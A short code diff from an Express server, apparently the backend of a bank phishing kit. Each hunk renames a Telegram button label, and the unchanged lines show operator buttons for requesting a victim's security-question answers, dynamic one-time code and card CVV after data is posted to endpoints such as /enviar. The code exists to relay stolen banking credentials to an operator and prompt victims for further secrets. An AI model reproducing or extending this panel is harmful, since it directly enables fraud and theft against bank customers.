@@ -79,7 +79,7 @@ app.post('/enviar', async (req, res) => {
   [
     { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
     { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+    { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
   ],
   [
     { text: "💳C3VV", callback_data: `ceve:${txid}` },
@@ -132,7 +132,7 @@ app.post('/enviare', async (req, res) => {
   [
     { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
     { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+    { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
   ],
   [
     { text: "💳C3VV", callback_data: `ceve:${txid}` },
@@ -182,7 +182,7 @@ ${pregunta2}❓ : <code>${respuesta2}</code>
   [
     { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
     { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+    { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
   ],
   [
     { text: "💳C3VV", callback_data: `ceve:${txid}` },
@@ -236,7 +236,7 @@ ${pregunta2}❓ : <code>${respuesta2}</code>
   [
     { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
     { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+    { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
   ],
   [
     { text: "💳C3VV", callback_data: `ceve:${txid}` },
@@ -285,7 +285,7 @@ app.post('/enviar3', async (req, res) => {
   [
     { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
     { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+    { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
   ],
   [
     { text: "💳C3VV", callback_data: `ceve:${txid}` },
@@ -333,7 +333,7 @@ app.post('/enviar4', async (req, res) => {
   [
     { text: "🔐PREGS", callback_data: `preguntas_menu:${txid}` },
     { text: "🔑CÓDIGO", callback_data: `cel-dina:${txid}` },
-    { text: "❌ERROR CÓDIGO", callback_data: `errortok:${txid}` }
+    { text: "❌CÓDIGO", callback_data: `errortok:${txid}` }
   ],
   [
     { text: "💳C3VV", callback_data: `ceve:${txid}` },
